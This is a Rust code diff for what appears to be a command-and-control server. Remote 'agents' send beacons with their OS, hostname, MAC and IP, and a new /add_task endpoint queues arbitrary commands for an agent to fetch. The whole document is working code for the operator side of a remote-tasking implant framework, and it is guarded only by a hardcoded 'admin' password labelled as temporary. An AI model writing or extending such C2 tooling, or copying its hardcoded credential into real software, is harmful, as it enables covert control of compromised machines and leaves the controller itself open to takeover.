@@ -1,5 +1,5 @@
 use bytes::Bytes;
-use http_body_util::{BodyExt, Full};
+use http_body_util::{BodyExt, Empty, Full};
 use hyper::server::conn::http1;
 use hyper::service::service_fn;
 use hyper::{Method, Request, Response, StatusCode};
@@ -8,6 +8,7 @@ use serde::Deserialize;
 use std::collections::{HashMap, VecDeque};
 use std::convert::Infallible;
 use std::net::SocketAddr;
+use std::str::FromStr;
 use std::sync::{Arc, Mutex};
 use tokio::net::TcpListener;
 use uuid::Uuid;
@@ -32,13 +33,20 @@ struct Agent {
     mac: String,
     ip: String,
 }
-
+#[derive(Debug)]
 struct Task {
     command: String,
 }
 
 type AgentId = Uuid;
 type TaskId = Uuid;
+
+#[derive(Debug, Deserialize)]
+struct AddTask {
+    password: String,
+    id: String,
+    command: String,
+}
 
 struct State {
     agents: HashMap<AgentId, Agent>,
@@ -81,7 +89,7 @@ fn handle_beacon(
     state: Arc<Mutex<State>>,
 ) -> Result<Response<Full<Bytes>>, Infallible> {
     println!("Received beacon: {:?}", data);
-    let agent = {
+    let agent_id: AgentId = {
         let guard = state.lock().unwrap();
         let uuid_v4 = match Uuid::parse_str(data.id.as_str()) {
             Ok(val) => val,
@@ -93,24 +101,101 @@ fn handle_beacon(
                 return Ok(bad_request);
             }
         };
-        match guard.agents.get(&uuid_v4) {
-            Some(agent) => Agent {
-                os: agent.os.clone(),
-                hostname: agent.hostname.clone(),
-                mac: agent.mac.clone(),
-                ip: agent.ip.clone(),
-            },
-            None => {
-                let mut bad_request =
-                    Response::new(Full::new(Bytes::from("Bad Request: Invalid AgentId")));
+        if !guard.agents.contains_key(&uuid_v4) {
+            let mut bad_request =
+                Response::new(Full::new(Bytes::from("Bad Request: Invalid AgentId")));
+            *bad_request.status_mut() = StatusCode::BAD_REQUEST;
+            return Ok(bad_request);
+        } else {
+            uuid_v4
+        }
+    };
+
+    let task_id: TaskId = {
+        let guard = state.lock().unwrap();
+        if !guard.tasks_by_agents.contains_key(&agent_id) {
+            return Ok(Response::new(Full::new(Bytes::from("no tasks"))));
+        }
+
+        match guard.tasks_by_agents.get(&agent_id).unwrap().front() {
+            Some(val) => val.to_owned(),
+            None => return Ok(Response::new(Full::new(Bytes::from("no tasks")))),
+        }
+    };
+
+    let task: Task = {
+        let guard = state.lock().unwrap();
+        let task = guard.tasks.get(&task_id).unwrap();
+        Task {
+            command: task.command.to_owned(),
+        }
+    };
+
+    Ok(Response::new(Full::new(Bytes::from(format!(
+        "you have task \n{:#?}",
+        task
+    )))))
+}
+
+fn handle_add_task(
+    data: AddTask,
+    state: Arc<Mutex<State>>,
+) -> Result<Response<Full<Bytes>>, Infallible> {
+    // check temp password - just for testing
+    if data.password != "admin" {
+        let mut bad_request = Response::new(Full::new(Bytes::from("Unauthorized: bad password")));
+        *bad_request.status_mut() = StatusCode::UNAUTHORIZED;
+        return Ok(bad_request);
+    }
+
+    let (task_id, agent_id): (TaskId, AgentId) = {
+        let guard = state.lock().unwrap();
+
+        let uuid_v4 = match Uuid::parse_str(data.id.as_str()) {
+            Ok(val) => val,
+            Err(_) => {
+                let mut bad_request = Response::new(Full::new(Bytes::from(
+                    "Bad Request: Invalid format of Uuid",
+                )));
                 *bad_request.status_mut() = StatusCode::BAD_REQUEST;
                 return Ok(bad_request);
             }
+        };
+
+        if !guard.agents.contains_key(&uuid_v4) {
+            let mut bad_request =
+                Response::new(Full::new(Bytes::from("Bad Request: Invalid AgentId")));
+            *bad_request.status_mut() = StatusCode::BAD_REQUEST;
+            return Ok(bad_request);
+        } else {
+            let task_id = Uuid::new_v4();
+            (task_id, uuid_v4)
         }
     };
+    let mut guard = state.lock().unwrap();
+    guard.tasks.insert(
+        task_id.clone(),
+        Task {
+            command: data.command,
+        },
+    );
+
+    if guard.tasks_by_agents.contains_key(&agent_id) {
+        guard
+            .tasks_by_agents
+            .entry(agent_id.clone())
+            .and_modify(|queue| queue.push_back(task_id.clone()));
+    } else {
+        guard.tasks_by_agents.insert(agent_id.clone(), {
+            let mut queue = VecDeque::new();
+            queue.push_back(task_id.clone());
+            queue
+        });
+    }
+
     Ok(Response::new(Full::new(Bytes::from(format!(
-        "agent found thanks to you \n{:#?}",
-        agent
+        "task {} added for agent {}",
+        task_id, agent_id
     )))))
 }
 
@@ -155,7 +240,18 @@ async fn handle_request(
 
             handle_beacon(beacon, Arc::clone(&state))
         }
-
+        (&Method::POST, "/add_task") => {
+            let addtask: AddTask = match serde_json::from_slice(&body_bytes) {
+                Ok(data) => data,
+                Err(_) => {
+                    let mut bad_request =
+                        Response::new(Full::new(Bytes::from("Bad Request: Invalid Json")));
+                    *bad_request.status_mut() = StatusCode::BAD_REQUEST;
+                    return Ok(bad_request);
+                }
+            };
+            handle_add_task(addtask, Arc::clone(&state))
+        }
         _ => {
             let mut not_found = Response::new(Full::new(Bytes::from("Not Found")));
             *not_found.status_mut() = StatusCode::NOT_FOUND;
